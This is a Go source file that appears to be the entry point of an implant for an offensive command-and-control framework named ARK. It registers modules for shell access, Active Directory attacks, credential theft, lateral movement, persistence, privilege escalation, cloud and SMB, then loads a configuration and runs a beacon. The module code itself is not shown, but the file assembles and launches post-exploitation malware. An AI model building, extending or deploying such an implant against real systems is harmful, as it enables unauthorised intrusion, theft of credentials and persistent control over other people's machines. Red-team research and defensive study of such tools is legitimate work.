package main

import (
	"log"

	"github.com/KKingZero/ARK/implant"
	_ "github.com/KKingZero/ARK/implant/modules"         // Register shell module
	_ "github.com/KKingZero/ARK/implant/modules/ad"      // Register AD modules
	_ "github.com/KKingZero/ARK/implant/modules/creds"   // Register creds modules
	_ "github.com/KKingZero/ARK/implant/modules/lateral" // Register lateral modules
	_ "github.com/KKingZero/ARK/implant/modules/persist" // Register persist modules
	_ "github.com/KKingZero/ARK/implant/modules/cloud"   // Register cloud modules
	_ "github.com/KKingZero/ARK/implant/modules/privesc" // Register privesc modules
	_ "github.com/KKingZero/ARK/implant/modules/smb"     // Register remote SMB client
)

func main() {
	cfg, err := implant.LoadConfig()
	if err != nil {
		log.Fatalf("load config: %v", err)
	}

	beacon, err := implant.New(cfg)
	if err != nil {
		log.Fatalf("init beacon: %v", err)
	}
	beacon.Run()
}
